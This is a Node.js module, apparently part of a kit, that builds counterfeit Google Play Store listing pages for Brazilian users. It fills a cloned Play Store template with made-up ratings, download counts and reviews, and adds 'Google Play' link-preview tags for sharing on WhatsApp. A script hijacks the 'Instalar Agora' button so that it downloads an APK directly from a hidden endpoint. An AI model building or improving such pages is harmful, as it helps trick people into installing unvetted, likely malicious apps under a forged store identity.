const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const TEMPLATE = fs.readFileSync(path.join(__dirname, '..', 'views', 'template.html'), 'utf8');
const COMENTARIO_TEMPLATE = fs.readFileSync(path.join(__dirname, 'comentario-template.html'), 'utf8');

// Correção do carrossel de capturas: o template herdava height:100% em cadeia,
// o que reservava ~575px de espaço em branco após os cards no mobile.
const CORRECAO_CSS = '<style>' +
  '.aoJE7e.qwPPwf{height:auto!important}' +
  '.aoJE7e.qwPPwf .ULeU3b{height:auto!important;width:164px!important}' +
  '.aoJE7e.qwPPwf .Atcj9b{height:auto!important}' +
  '.aoJE7e.qwPPwf img.B5GQxf{height:auto!important;width:100%!important;max-height:none!important}' +
  '.bewvKb.KUSTKe{height:auto!important}' +
  '</style>';

// Fallback do selo de classificação: se o PNG do Google não existir (ex.: Livre),
// a página desenha um selo equivalente localmente, sem depender de rede.
const FALLBACK_SELO = '<script>(function(){' +
  'function selo(t){' +
    'var ch=(t==="LIVRE")?46:100;' +
    'var s="%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%27272%27 height=%27272%27 viewBox=%270 0 272 272%27%3E%3Crect width=%27272%27 height=%27272%27 fill=%27white%27/%3E%3Crect x=%276%27 y=%276%27 width=%27260%27 height=%27260%27 fill=%27none%27 stroke=%27black%27 stroke-width=%274%27/%3E%3Ctext x=%27136%27 y=%27"+(t==="LIVRE"?146:172)+"%27 font-family=%27Arial,sans-serif%27 font-size=%27"+ch+"%27 font-weight=%27bold%27 text-anchor=%27middle%27 fill=%27black%27%3E"+t+"%3C/text%3E%3C/svg%3E";' +
    'return "data:image/svg+xml,"+s;' +
  '}' +
  'document.addEventListener("error",function(e){' +
    'var el=e.target;' +
    'if(!el||el.tagName!=="IMG"||!/ClassInd_/.test(el.src||""))return;' +
    'var m=(el.src.match(/ClassInd_([^_/]+)_/)||[])[1];' +
    'if(!m)return;' +
    'el.onerror=null;' +
    'el.src=selo(m==="Livre"?"LIVRE":m);' +
  '},true);' +
  '})();<\/script>';

// Download automático do APK ao clicar em "Instalar Agora".
// Intercepta na fase de captura, antes dos handlers do template.
// Download automático do APK ao clicar em "Instalar Agora".
// Intercepta na fase de captura, registrado no <head> antes dos scripts do template.
// Usa o endpoint interno /api/download: o link do Storage nunca aparece ao visitante
// e o servidor envia Content-Disposition attachment (download direto, sem navegar).
function scriptDownloadApk(token) {
  return '<script>(function(){' +
    'var D=location.origin+"/api/download?token="+' + JSON.stringify(token) + ';' +
    'document.addEventListener("click",function(e){' +
      'var b=e.target&&e.target.closest&&e.target.closest("button[aria-label=\\"Instalar Agora\\"]");' +
      'if(!b)return;' +
      'e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();' +
      'window.location.assign(D);' +
    '},true);' +
  '})();<\/script>';
}

function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function texto(s) {
  return esc(s).replace(/\r?\n/g, '<br>');
}

function gerarEstrelasHtml(qtde) {
  let html = '';
  for (let i = 1; i <= 5; i++) {
    const interna = i <= qtde ? 'Z1Dz7b' : 'Wi7KIe';
    html += '<span aria-hidden="true" jsname="fI6EEc" class="F7XJmb" data-number="' + i + '"><span class="notranslate ' + interna + '" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"></path><path d="M0 0h24v24H0z" fill="none"></path><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path></svg></span></span>';
  }
  return html;
}

function gerarComentario(c, indice) {
  const estrelas = Math.min(5, Math.max(1, parseInt(c.estrelas, 10) || 5));
  const foto = /^https?:\/\//i.test(String(c.foto || '')) ? String(c.foto) : '';
  const util = Math.max(0, parseInt(c.util, 10) || 0);
  return COMENTARIO_TEMPLATE
    .replace(/\{\{ID\}\}/g, c.id)
    .replace(/\{\{MENU_ID\}\}/g, 'UM33ifc' + indice)
    .replace(/\{\{MENU_UID\}\}/g, 'ucc-' + indice)
    .replace(/\{\{FOTO2X\}\}/g, foto)
    .replace(/\{\{FOTO\}\}/g, foto)
    .replace(/\{\{ESTRELAS_HTML\}\}/g, gerarEstrelasHtml(estrelas))
    .replace(/\{\{ESTRELAS\}\}/g, String(estrelas))
    .replace(/\{\{NOME\}\}/g, texto(c.nome))
    .replace(/\{\{DATA\}\}/g, texto(c.data))
    .replace(/\{\{TEXTO\}\}/g, texto(c.texto))
    .replace(/\{\{UTIL\}\}/g, String(util));
}

function gerarComentarios(comentarios) {
  const lista = Array.isArray(comentarios) ? comentarios : [];
  return lista.map(gerarComentario).join('');
}

// Remove o menor bloco (marcado por classe/elemento) que contém o placeholder.
// Usado para desligar seções na página gerada (toggles do gerador).
function fimDoBloco(html, inicio, tag) {
  const abre = '<' + tag;
  const fecha = '</' + tag + '>';
  let i = inicio + abre.length;
  let depth = 1;
  while (i < html.length && depth > 0) {
    const pa = html.indexOf(abre, i);
    const pf = html.indexOf(fecha, i);
    if (pf === -1) return -1;
    if (pa !== -1 && pa < pf && /\s|>/.test(html.charAt(pa + abre.length))) {
      depth++;
      i = pa + abre.length;
    } else {
      depth--;
      i = pf + fecha.length;
    }
  }
  return depth === 0 ? i : -1;
}

function removerBlocoContendo(html, posPlaceholder, marca, tag) {
  let corte = -1;
  let busca = posPlaceholder;
  for (;;) {
    const i = html.lastIndexOf(marca, busca);
    if (i === -1 || i === 0) return html;
    const fim = fimDoBloco(html, i, tag);
    if (fim !== -1 && fim > posPlaceholder) {
      return html.slice(0, i) + html.slice(fim);
    }
    busca = i - 1;
  }
}

function removerTodas(html, placeholder, marca, tag) {
  let pos;
  while ((pos = html.indexOf(placeholder)) !== -1) {
    const novo = removerBlocoContendo(html, pos, marca, tag);
    if (novo.length === html.length) return html; // sem progresso: aborta
    html = novo;
  }
  return html;
}

function removerSecoes(html, exibir) {
  if (exibir.nota === false) html = removerTodas(html, '{{NOTA}}', '<div class="wVqUob', 'div');
  if (exibir.num_avaliacoes === false) html = removerTodas(html, '{{NUM_AVALIACOES}}', '<div class="wVqUob', 'div');
  if (exibir.classificacao === false) html = removerTodas(html, '{{CLASSIFICACAO}}', '<div class="wVqUob PSXKRc', 'div');
  if (exibir.downloads === false) html = removerTodas(html, '{{DOWNLOADS}}', '<div class="wVqUob', 'div');
  const offData = exibir.atualizado === false;
  const offLocal = exibir.disponivel === false;
  if (offData) html = removerTodas(html, '{{ATUALIZADO}}', '<div class="xg1aie', 'div');
  if (offLocal) html = removerTodas(html, '{{DISPONIVEL}}', '<div class="xg1aie', 'div');
  if (offData && offLocal) {
    // remover o contêiner que sobrou vazio em cada variante
    while (true) {
      const pos = html.indexOf('<div class="TKjAsc');
      if (pos === -1) break;
      const fim = fimDoBloco(html, pos, 'div');
      if (fim === -1) break;
      const trecho = html.slice(pos, fim);
      if (!/{{ATUALIZADO}}|{{DISPONIVEL}}|class="lXlx5/.test(trecho)) {
        html = html.slice(0, pos) + html.slice(fim);
      } else break;
    }
  }
  if (exibir.descricao === false) html = removerTodas(html, '{{DESCRICAO}}', '<section', 'section');
  if (exibir.screenshots === false) html = removerTodas(html, '{{SCREENSHOTS}}', '<c-wiz', 'c-wiz');
  if (exibir.comentarios === false) html = removerTodas(html, '{{COMENTARIOS}}', '<section', 'section');
  return html;
}

// Mapa da classificação indicativa (selos ClassInd usados pelo Play Store BR)
const CLASSIFICACOES = {
  // o arquivo oficial da Classificação Indicativa para Livre é "L" (não "Livre")
  'Livre': { img: 'L', texto: 'Livre' },
  '10': { img: '10', texto: 'Classificação 10 anos' },
  '12': { img: '12', texto: 'Classificação 12 anos' },
  '14': { img: '14', texto: 'Classificação 14 anos' },
  '16': { img: '16', texto: 'Classificação 16 anos' },
  '18': { img: '18', texto: 'Classificação 18 anos' }
};

// Normaliza o valor recebido. Retrocompatível com campanhas antigas de texto livre.
function classificacaoInfo(valor) {
  const texto = String(valor == null ? '' : valor).trim();
  if (CLASSIFICACOES[texto]) return CLASSIFICACOES[texto];
  if (/livre/i.test(texto)) return CLASSIFICACOES['Livre'];
  const m = texto.match(/\d{1,2}/);
  const num = m && CLASSIFICACOES[m[0]] ? m[0] : '16';
  return { img: num, texto: texto || CLASSIFICACOES[num].texto };
}

// Metas Open Graph para o preview do link no WhatsApp/redes sociais:
// título, descrição e ícone de cada página gerada.
function metasPreview(row) {
  const titulo = esc(String(row.titulo || '').trim().slice(0, 80) || 'Apps no Google Play');
  const descricao = esc(String(row.descricao_curta || '').slice(0, 160));
  const icone = /^https?:\/\//i.test(String(row.icone_url || ''))
    ? esc(String(row.icone_url).slice(0, 1000)) : '';
  return '<title>' + titulo + ' – Apps no Google Play</title>' +
    '<meta property="og:title" content="' + titulo + ' – Apps no Google Play">' +
    '<meta property="og:description" content="' + descricao + '">' +
    (icone ? '<meta property="og:image" content="' + icone + '">' +
      '<meta property="og:image:alt" content="' + titulo + '">' : '') +
    '<meta property="og:type" content="website">' +
    '<meta property="og:site_name" content="Google Play">' +
    '<meta name="twitter:card" content="summary">';
}

function gerarHtml(row) {
  let html = removerSecoes(TEMPLATE, row.exibir || {});
  const classif = classificacaoInfo(row.classificacao);
  html = html.replace(/\{\{CLASSIF\}\}/g, classif.img);
  html = html.replace(/\{\{TITULO\}\}/g, esc(row.titulo));
  html = html.replace(/\{\{EMPRESA\}\}/g, esc(row.empresa));
  html = html.replace(/\{\{DEV_ID\}\}/g, esc(row.dev_id));
  html = html.replace(/\{\{NOTA\}\}/g, esc(row.nota));
  html = html.replace(/\{\{NUM_AVALIACOES\}\}/g, esc(row.num_avaliacoes));
  html = html.replace(/\{\{CLASSIFICACAO\}\}/g, esc(classif.texto));
  html = html.replace(/\{\{DOWNLOADS\}\}/g, esc(row.downloads));
  html = html.replace(/\{\{ICONE\}\}/g, row.icone_url || '');
  html = html.replace(/\{\{DESCRICAO_CURTA\}\}/g, esc(row.descricao_curta));
  html = html.replace(/\{\{DESCRICAO\}\}/g, texto(row.descricao));
  html = html.replace(/\{\{ATUALIZADO\}\}/g, esc(row.atualizado_em));
  html = html.replace(/\{\{DISPONIVEL\}\}/g, esc(row.disponivel_em));

  const sc = row.screenshots || [];
  let scHtml = '';
  sc.forEach((src, i) => {
    scHtml += '<div role="listitem" class="ULeU3b Utde2e"><div class="Atcj9b" jscontroller="RQJprf"><img src="' + src + '" srcset="' + src + ' 2x" class="T75of B5GQxf" alt="Imagem da captura de tela" itemprop="image" data-screenshot-index="' + i + '" jsaction="click:IEAdff" role="button" tabindex="0" load="lazy"></div></div>';
  });
  html = html.replace(/\{\{SCREENSHOTS\}\}/g, scHtml);
  html = html.replace(/\{\{COMENTARIOS\}\}/g, gerarComentarios(row.comentarios));
  const extras = row.apk_url ? scriptDownloadApk(row.token) : '';
  html = html.replace(/<meta charset="UTF-8">/, '<meta charset="UTF-8">' + metasPreview(row) + extras);
  html = html.replace(/<\/body>/g, CORRECAO_CSS + FALLBACK_SELO + '</body>');
  return html;
}

module.exports = { gerarHtml, esc };
